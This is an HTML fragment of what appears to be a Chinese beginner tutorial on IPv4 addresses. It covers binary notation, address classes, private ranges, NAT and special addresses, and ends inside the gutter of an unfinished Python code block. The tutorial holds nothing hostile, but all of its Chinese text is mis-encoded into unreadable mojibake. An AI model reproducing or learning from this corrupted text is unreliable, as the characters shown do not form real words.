    <content type="html"><![CDATA[<h1>ç¬¬8å¤©ï¼šIPåœ°å€è¯¦è§£</h1><blockquote><p>â€œIPåœ°å€å°±åƒäº’è”ç½‘ä¸Šçš„é—¨ç‰Œå·ã€‚â€</p></blockquote><h2 id="ğŸ“š-ä»Šæ—¥ç›®æ ‡">ğŸ“š ä»Šæ—¥ç›®æ ‡</h2><ul><li>æ·±å…¥ç†è§£IPåœ°å€çš„æ¦‚å¿µå’Œä½œç”¨</li><li>æŒæ¡IPv4åœ°å€çš„æ ¼å¼å’Œè¡¨ç¤º</li><li>ç†è§£IPåœ°å€çš„åˆ†ç±»ï¼ˆA/B/C/D/Eç±»ï¼‰</li><li>åŒºåˆ†å…¬ç½‘IPå’Œç§ç½‘IP</li><li>ç¼–å†™IPåœ°å€åˆ†æå·¥å…·</li></ul><h2 id="ğŸ¯-ä»€ä¹ˆæ˜¯IPåœ°å€ï¼Ÿ">ğŸ¯ ä»€ä¹ˆæ˜¯IPåœ°å€ï¼Ÿ</h2><h3 id="ç”Ÿæ´»ä¸­çš„ä¾‹å­">ç”Ÿæ´»ä¸­çš„ä¾‹å­</h3><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">IPåœ°å€ = å®¶åº­ä½å€<br><br>åŒ—äº¬å¸‚æœé˜³åŒºxxè¡—é“xxå·  â†’  è¯¦ç»†åœ°å€<br><span class="hljs-number">192.168.1.100</span>            â†’  IPåœ°å€<br><br>ä½œç”¨ï¼š<br>- å”¯ä¸€æ ‡è¯†ç½‘ç»œä¸­çš„è®¾å¤‡<br>- è®©æ•°æ®åŒ…æ‰¾åˆ°ç›®çš„åœ°<br>- å®ç°è·¨ç½‘ç»œé€šä¿¡<br></code></pre></td></tr></table></figure><p><strong>IPåœ°å€</strong>ï¼ˆInternet Protocol Addressï¼‰æ˜¯åˆ†é…ç»™ç½‘ç»œè®¾å¤‡çš„æ•°å­—æ ‡è¯†ï¼Œç”¨äºåœ¨ç½‘ç»œä¸­å®šä½å’Œè¯†åˆ«è®¾å¤‡ã€‚</p><h3 id="IPåœ°å€çš„ä¸¤ä¸ªç‰ˆæœ¬">IPåœ°å€çš„ä¸¤ä¸ªç‰ˆæœ¬</h3><table><thead><tr><th>ç‰ˆæœ¬</th><th>å…¨ç§°</th><th>åœ°å€é•¿åº¦</th><th>åœ°å€æ•°é‡</th><th>ä¾‹å­</th></tr></thead><tbody><tr><td>IPv4</td><td>Internet Protocol version 4</td><td>32ä½</td><td>çº¦43äº¿ä¸ª</td><td>192.168.1.1</td></tr><tr><td>IPv6</td><td>Internet Protocol version 6</td><td>128ä½</td><td>çº¦340ä¸‡äº¿äº¿äº¿ä¸ª</td><td>2001:0db8::1</td></tr></tbody></table><p><strong>æœ¬èŠ‚é‡ç‚¹</strong>ï¼šIPv4ï¼ˆæœ€å¸¸ç”¨ï¼‰</p><h2 id="ğŸ“Š-IPv4åœ°å€æ ¼å¼">ğŸ“Š IPv4åœ°å€æ ¼å¼</h2><h3 id="äºŒè¿›åˆ¶å’Œåè¿›åˆ¶è¡¨ç¤º">äºŒè¿›åˆ¶å’Œåè¿›åˆ¶è¡¨ç¤º</h3><p>IPv4åœ°å€æ˜¯32ä½äºŒè¿›åˆ¶æ•°ï¼Œåˆ†æˆ4ç»„ï¼Œæ¯ç»„8ä½ï¼ˆ1å­—èŠ‚ï¼‰ï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">äºŒè¿›åˆ¶è¡¨ç¤ºï¼ˆ<span class="hljs-number">32</span>ä½ï¼‰ï¼š<br><span class="hljs-number">11000000</span>.<span class="hljs-number">10101000</span>.<span class="hljs-number">00000001</span>.<span class="hljs-number">00000001</span><br><br>è½¬æ¢ä¸ºåè¿›åˆ¶ï¼ˆç‚¹åˆ†åè¿›åˆ¶ï¼‰ï¼š<br><span class="hljs-number">192.168.1.1</span><br><br>æ¯ç»„èŒƒå›´ï¼š<span class="hljs-number">0-255ï¼ˆ2^8</span> = <span class="hljs-number">256</span>ï¼‰<br></code></pre></td></tr></table></figure><h3 id="è½¬æ¢ç¤ºä¾‹">è½¬æ¢ç¤ºä¾‹</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">192.168.1.1</span> çš„è½¬æ¢è¿‡ç¨‹ï¼š<br><br><span class="hljs-number">192</span>  = <span class="hljs-number">11000000</span>  (<span class="hljs-number">128</span>+<span class="hljs-number">64</span> = <span class="hljs-number">192</span>)<br><span class="hljs-number">168</span>  = <span class="hljs-number">10101000</span>  (<span class="hljs-number">128+32+8</span> = <span class="hljs-number">168</span>)<br><span class="hljs-number">1</span>    = <span class="hljs-number">00000001</span>  (<span class="hljs-number">1</span>)<br><span class="hljs-number">1</span>    = <span class="hljs-number">00000001</span>  (<span class="hljs-number">1</span>)<br><br>å®Œæ•´äºŒè¿›åˆ¶ï¼š<br><span class="hljs-number">11000000</span> <span class="hljs-number">10101000</span> <span class="hljs-number">00000001</span> <span class="hljs-number">00000001</span><br></code></pre></td></tr></table></figure><h3 id="åœ°å€èŒƒå›´">åœ°å€èŒƒå›´</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">æœ€å°IPåœ°å€ï¼š<span class="hljs-number">0.0.0.0</span><br>æœ€å¤§IPåœ°å€ï¼š<span class="hljs-number">255.255.255.255</span><br><br>æ€»æ•°ï¼š<span class="hljs-number">2</span>^<span class="hljs-number">32</span> = <span class="hljs-number">4</span>,<span class="hljs-number">294,967</span>,<span class="hljs-number">296</span> ä¸ªï¼ˆçº¦<span class="hljs-number">43</span>äº¿ï¼‰<br></code></pre></td></tr></table></figure><h2 id="ğŸ·ï¸-IPåœ°å€åˆ†ç±»">ğŸ·ï¸ IPåœ°å€åˆ†ç±»</h2><p>IPv4åœ°å€åˆ†ä¸º5ç±»ï¼šAã€Bã€Cã€Dã€Eç±»</p><h3 id="Aç±»åœ°å€">Aç±»åœ°å€</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">æ ¼å¼ï¼š<span class="hljs-number">0</span>xxxxxxx<span class="hljs-selector-class">.xxxxxxxx</span><span class="hljs-selector-class">.xxxxxxxx</span><span class="hljs-selector-class">.xxxxxxxx</span><br>     <span class="hljs-selector-attr">[ç½‘ç»œå·]</span>.<span class="hljs-selector-attr">[  ä¸»æœºå·ï¼ˆ24ä½ï¼‰  ]</span><br><br>èŒƒå›´ï¼š<span class="hljs-number">1.0</span>.<span class="hljs-number">0.0</span> - <span class="hljs-number">126.255</span>.<span class="hljs-number">255.255</span><br>ç½‘ç»œæ•°ï¼š<span class="hljs-number">126</span>ä¸ªï¼ˆ<span class="hljs-number">2</span>^<span class="hljs-number">7</span> - <span class="hljs-number">2</span>ï¼Œå»æ‰<span class="hljs-number">0</span>å’Œ<span class="hljs-number">127</span>ï¼‰<br>æ¯ä¸ªç½‘ç»œçš„ä¸»æœºæ•°ï¼š<span class="hljs-number">16</span>,<span class="hljs-number">777</span>,<span class="hljs-number">214</span>ä¸ªï¼ˆ<span class="hljs-number">2</span>^<span class="hljs-number">24</span> - <span class="hljs-number">2</span>ï¼‰<br><br>ç”¨é€”ï¼šå¤§å‹ç½‘ç»œï¼ˆå¦‚å¤§å‹ä¼ä¸šã€ISPï¼‰<br>ä¾‹å­ï¼š<span class="hljs-number">10.0</span>.<span class="hljs-number">0.0</span>ï¼ˆç§ç½‘ï¼‰<br></code></pre></td></tr></table></figure><h3 id="Bç±»åœ°å€">Bç±»åœ°å€</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">æ ¼å¼ï¼š<span class="hljs-number">10</span>xxxxxx<span class="hljs-selector-class">.xxxxxxxx</span><span class="hljs-selector-class">.xxxxxxxx</span><span class="hljs-selector-class">.xxxxxxxx</span><br>     <span class="hljs-selector-attr">[  ç½‘ç»œå·ï¼ˆ16ä½ï¼‰ ]</span>.<span class="hljs-selector-attr">[ä¸»æœºå·ï¼ˆ16ä½ï¼‰]</span><br><br>èŒƒå›´ï¼š<span class="hljs-number">128.0</span>.<span class="hljs-number">0.0</span> - <span class="hljs-number">191.255</span>.<span class="hljs-number">255.255</span><br>ç½‘ç»œæ•°ï¼š<span class="hljs-number">16</span>,<span class="hljs-number">384</span>ä¸ªï¼ˆ<span class="hljs-number">2</span>^<span class="hljs-number">14</span>ï¼‰<br>æ¯ä¸ªç½‘ç»œçš„ä¸»æœºæ•°ï¼š<span class="hljs-number">65</span>,<span class="hljs-number">534</span>ä¸ªï¼ˆ<span class="hljs-number">2</span>^<span class="hljs-number">16</span> - <span class="hljs-number">2</span>ï¼‰<br><br>ç”¨é€”ï¼šä¸­å‹ç½‘ç»œï¼ˆå¦‚å¤§å­¦ã€ä¸­å‹ä¼ä¸šï¼‰<br>ä¾‹å­ï¼š<span class="hljs-number">172.16</span>.<span class="hljs-number">0.0</span>ï¼ˆç§ç½‘ï¼‰<br></code></pre></td></tr></table></figure><h3 id="Cç±»åœ°å€">Cç±»åœ°å€</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">æ ¼å¼ï¼š<span class="hljs-number">110</span>xxxxx<span class="hljs-selector-class">.xxxxxxxx</span><span class="hljs-selector-class">.xxxxxxxx</span><span class="hljs-selector-class">.xxxxxxxx</span><br>     <span class="hljs-selector-attr">[     ç½‘ç»œå·ï¼ˆ24ä½ï¼‰    ]</span>.<span class="hljs-selector-attr">[ä¸»æœºå·]</span><br><br>èŒƒå›´ï¼š<span class="hljs-number">192.0</span>.<span class="hljs-number">0.0</span> - <span class="hljs-number">223.255</span>.<span class="hljs-number">255.255</span><br>ç½‘ç»œæ•°ï¼š<span class="hljs-number">2</span>,<span class="hljs-number">097</span>,<span class="hljs-number">152</span>ä¸ªï¼ˆ<span class="hljs-number">2</span>^<span class="hljs-number">21</span>ï¼‰<br>æ¯ä¸ªç½‘ç»œçš„ä¸»æœºæ•°ï¼š<span class="hljs-number">254</span>ä¸ªï¼ˆ<span class="hljs-number">2</span>^<span class="hljs-number">8</span> - <span class="hljs-number">2</span>ï¼‰<br><br>ç”¨é€”ï¼šå°å‹ç½‘ç»œï¼ˆå¦‚å®¶åº­ã€å°å‹åŠå…¬å®¤ï¼‰<br>ä¾‹å­ï¼š<span class="hljs-number">192.168</span>.<span class="hljs-number">1.0</span>ï¼ˆç§ç½‘ï¼‰<br></code></pre></td></tr></table></figure><h3 id="Dç±»åœ°å€ï¼ˆç»„æ’­ï¼‰">Dç±»åœ°å€ï¼ˆç»„æ’­ï¼‰</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">æ ¼å¼ï¼š<span class="hljs-number">1110</span>xxxx.xxxxxxxx.xxxxxxxx.xxxxxxxx<br><br>èŒƒå›´ï¼š<span class="hljs-number">224.0.0.0</span> - <span class="hljs-number">239.255.255.255</span><br><br>ç”¨é€”ï¼šç»„æ’­ï¼ˆå¤šæ’­ï¼‰åœ°å€<br>      ä¸€å¯¹å¤šçš„é€šä¿¡<br>ä¾‹å­ï¼š<span class="hljs-number">224.0.0.1</span>ï¼ˆæ‰€æœ‰ä¸»æœºç»„ï¼‰<br></code></pre></td></tr></table></figure><h3 id="Eç±»åœ°å€ï¼ˆä¿ç•™ï¼‰">Eç±»åœ°å€ï¼ˆä¿ç•™ï¼‰</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">æ ¼å¼ï¼š<span class="hljs-number">1111</span>xxxx<span class="hljs-selector-class">.xxxxxxxx</span><span class="hljs-selector-class">.xxxxxxxx</span><span class="hljs-selector-class">.xxxxxxxx</span><br><br>èŒƒå›´ï¼š<span class="hljs-number">240.0</span>.<span class="hljs-number">0.0</span> - <span class="hljs-number">255.255</span>.<span class="hljs-number">255.255</span><br><br>ç”¨é€”ï¼šä¿ç•™ç”¨äºå°†æ¥æˆ–å®éªŒ<br></code></pre></td></tr></table></figure><h3 id="åˆ†ç±»æ€»ç»“">åˆ†ç±»æ€»ç»“</h3><table><thead><tr><th>ç±»åˆ«</th><th>é¦–å­—èŠ‚èŒƒå›´</th><th>ç½‘ç»œæ•°</th><th>ä¸»æœºæ•°/ç½‘ç»œ</th><th>ç”¨é€”</th></tr></thead><tbody><tr><td>A</td><td>1-126</td><td>126</td><td>16,777,214</td><td>å¤§å‹ç½‘ç»œ</td></tr><tr><td>B</td><td>128-191</td><td>16,384</td><td>65,534</td><td>ä¸­å‹ç½‘ç»œ</td></tr><tr><td>C</td><td>192-223</td><td>2,097,152</td><td>254</td><td>å°å‹ç½‘ç»œ</td></tr><tr><td>D</td><td>224-239</td><td>-</td><td>-</td><td>ç»„æ’­</td></tr><tr><td>E</td><td>240-255</td><td>-</td><td>-</td><td>ä¿ç•™</td></tr></tbody></table><h2 id="ğŸŒ-å…¬ç½‘IP-vs-ç§ç½‘IP">ğŸŒ å…¬ç½‘IP vs ç§ç½‘IP</h2><h3 id="å…¬ç½‘IPï¼ˆPublic-IPï¼‰">å…¬ç½‘IPï¼ˆPublic IPï¼‰</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">å®šä¹‰ï¼šå¯ä»¥åœ¨äº’è”ç½‘ä¸Šç›´æ¥è®¿é—®çš„IPåœ°å€<br>ç‰¹ç‚¹ï¼š<br><span class="hljs-bullet">- </span>å…¨çƒå”¯ä¸€<br><span class="hljs-bullet">- </span>å¯ä»¥ä»äº’è”ç½‘ä»»ä½•åœ°æ–¹è®¿é—®<br><span class="hljs-bullet">- </span>éœ€è¦å‘ISPç”³è¯·<br><span class="hljs-bullet">- </span>æ•°é‡æœ‰é™ï¼Œéœ€è¦ä»˜è´¹<br><br>ä¾‹å­ï¼š<br><span class="hljs-bullet">- </span>8.8.8.8ï¼ˆGoogle DNSï¼‰<br><span class="hljs-bullet">- </span>114.114.114.114ï¼ˆå›½å†…DNSï¼‰<br><span class="hljs-bullet">- </span>220.181.38.148ï¼ˆç™¾åº¦ï¼‰<br></code></pre></td></tr></table></figure><h3 id="ç§ç½‘IPï¼ˆPrivate-IPï¼‰">ç§ç½‘IPï¼ˆPrivate IPï¼‰</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs dns">å®šä¹‰ï¼šåªèƒ½åœ¨å±€åŸŸç½‘å†…ä½¿ç”¨çš„IPåœ°å€<br>ç‰¹ç‚¹ï¼š<br>- ä¸èƒ½åœ¨äº’è”ç½‘ä¸Šç›´æ¥è®¿é—®<br>- å¯ä»¥é‡å¤ä½¿ç”¨ï¼ˆä¸åŒå±€åŸŸç½‘å¯ä»¥ç”¨ç›¸åŒçš„ç§ç½‘IPï¼‰<br>- å…è´¹ä½¿ç”¨<br>- éœ€è¦é€šè¿‡NATè®¿é—®äº’è”ç½‘<br><br>ç§ç½‘IPåœ°å€èŒƒå›´ï¼ˆRFC <span class="hljs-number">1918</span>ï¼‰ï¼š<br><span class="hljs-keyword">A</span>ç±»ï¼š<span class="hljs-number">10.0.0.0</span>      - <span class="hljs-number">10.255.255.255</span>    (<span class="hljs-number">10.0.0.0</span>/<span class="hljs-number">8</span>)<br>Bç±»ï¼š<span class="hljs-number">172.16.0.0</span>    - <span class="hljs-number">172.31.255.255</span>    (<span class="hljs-number">172.16.0.0</span>/<span class="hljs-number">12</span>)<br>Cç±»ï¼š<span class="hljs-number">192.168.0.0</span>   - <span class="hljs-number">192.168.255.255</span>   (<span class="hljs-number">192.168.0.0</span>/<span class="hljs-number">16</span>)<br></code></pre></td></tr></table></figure><h3 id="å¯¹æ¯”">å¯¹æ¯”</h3><table><thead><tr><th>ç‰¹æ€§</th><th>å…¬ç½‘IP</th><th>ç§ç½‘IP</th></tr></thead><tbody><tr><td>å¯è®¿é—®æ€§</td><td>äº’è”ç½‘å¯è®¿é—®</td><td>ä»…å±€åŸŸç½‘å¯è®¿é—®</td></tr><tr><td>å”¯ä¸€æ€§</td><td>å…¨çƒå”¯ä¸€</td><td>å¯é‡å¤ä½¿ç”¨</td></tr><tr><td>è·å–æ–¹å¼</td><td>ISPåˆ†é…</td><td>è‡ªè¡Œåˆ†é…</td></tr><tr><td>è´¹ç”¨</td><td>é€šå¸¸æ”¶è´¹</td><td>å…è´¹</td></tr><tr><td>æ•°é‡</td><td>æœ‰é™</td><td>å……è¶³</td></tr></tbody></table><h3 id="NATï¼ˆç½‘ç»œåœ°å€è½¬æ¢ï¼‰">NATï¼ˆç½‘ç»œåœ°å€è½¬æ¢ï¼‰</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs 1c">å®¶åº­ç½‘ç»œç¤ºä¾‹ï¼š<br><br>äº’è”ç½‘ï¼ˆå…¬ç½‘IPï¼š<span class="hljs-number">123.45</span>.<span class="hljs-number">67.89</span>ï¼‰<br>    <span class="hljs-string">|</span><br>   è·¯ç”±å™¨ï¼ˆNATè®¾å¤‡ï¼‰<br>    <span class="hljs-string">|</span><br>å±€åŸŸç½‘ï¼ˆç§ç½‘IPï¼‰<br>    <span class="hljs-string">|-- ç”µè„‘1: 192.168.1.100</span><br>    <span class="hljs-string">|-- ç”µè„‘2: 192.168.1.101</span><br>    <span class="hljs-string">|-- æ‰‹æœº: 192.168.1.102</span><br><br>NATçš„ä½œç”¨ï¼š<br>å°†å±€åŸŸç½‘çš„ç§ç½‘IPè½¬æ¢ä¸ºå…¬ç½‘IPï¼Œ<br>ä½¿ç§ç½‘è®¾å¤‡å¯ä»¥è®¿é—®äº’è”ç½‘ã€‚<br></code></pre></td></tr></table></figure><h2 id="ğŸ”-ç‰¹æ®ŠIPåœ°å€">ğŸ” ç‰¹æ®ŠIPåœ°å€</h2><h3 id="1-ç¯å›åœ°å€ï¼ˆLoopbackï¼‰">1. ç¯å›åœ°å€ï¼ˆLoopbackï¼‰</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">åœ°å€ï¼š127.0.0.0 - 127.255.255.255<br>å¸¸ç”¨ï¼š127.0.0.1<br><br>ä½œç”¨ï¼šæœ¬æœºæµ‹è¯•ï¼Œæ•°æ®ä¸ä¼šå‘é€åˆ°ç½‘ç»œ<br>åˆ«åï¼šlocalhost<br><br>ç”¨é€”ï¼š<br><span class="hljs-bullet">- </span>æµ‹è¯•ç½‘ç»œç¨‹åº<br><span class="hljs-bullet">- </span>æœ¬åœ°å¼€å‘<br><span class="hljs-bullet">- </span>è¯Šæ–­TCP/IPåè®®æ ˆ<br></code></pre></td></tr></table></figure><h3 id="2-ç½‘ç»œåœ°å€">2. ç½‘ç»œåœ°å€</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">å®šä¹‰ï¼šä¸»æœºå·å…¨ä¸º<span class="hljs-number">0</span>çš„åœ°å€<br>ä¾‹å­ï¼š<span class="hljs-number">192.168.1.0</span><br><br>ä½œç”¨ï¼šè¡¨ç¤ºæ•´ä¸ªç½‘ç»œï¼Œä¸èƒ½åˆ†é…ç»™ä¸»æœº<br></code></pre></td></tr></table></figure><h3 id="3-å¹¿æ’­åœ°å€">3. å¹¿æ’­åœ°å€</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">å®šä¹‰ï¼šä¸»æœºå·å…¨ä¸º<span class="hljs-number">1</span>çš„åœ°å€<br>ä¾‹å­ï¼š<span class="hljs-number">192.168.1.255</span><br><br>ä½œç”¨ï¼šå‘ç½‘ç»œä¸­æ‰€æœ‰ä¸»æœºå‘é€æ•°æ®<br></code></pre></td></tr></table></figure><h3 id="4-é»˜è®¤è·¯ç”±">4. é»˜è®¤è·¯ç”±</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">åœ°å€ï¼š0.0.0.0<br><br>ä½œç”¨ï¼š<br><span class="hljs-bullet">- </span>è¡¨ç¤º&quot;ä»»æ„åœ°å€&quot;<br><span class="hljs-bullet">- </span>è·¯ç”±è¡¨ä¸­çš„é»˜è®¤è·¯ç”±<br><span class="hljs-bullet">- </span>æœåŠ¡å™¨ç›‘å¬æ‰€æœ‰ç½‘ç»œæ¥å£<br></code></pre></td></tr></table></figure><h3 id="5-å—é™å¹¿æ’­åœ°å€">5. å—é™å¹¿æ’­åœ°å€</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">åœ°å€ï¼š<span class="hljs-number">255.255.255.255</span><br><br>ä½œç”¨ï¼šå‘æœ¬åœ°ç½‘ç»œå¹¿æ’­ï¼Œä¸ä¼šè¢«è·¯ç”±å™¨è½¬å‘<br></code></pre></td></tr></table></figure><h2 id="ğŸ”§-å®æˆ˜é¡¹ç›®ï¼šIPåœ°å€åˆ†æå·¥å…·">ğŸ”§ å®æˆ˜é¡¹ç›®ï¼šIPåœ°å€åˆ†æå·¥å…·</h2><p>è®©æˆ‘ä»¬ç¼–å†™ä¸€ä¸ªIPåœ°å€åˆ†æå·¥å…·ï¼Œå®ç°å„ç§IPåœ°å€ç›¸å…³åŠŸèƒ½ï¼</p><h3 id="ä»£ç å®ç°">ä»£ç å®ç°</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span 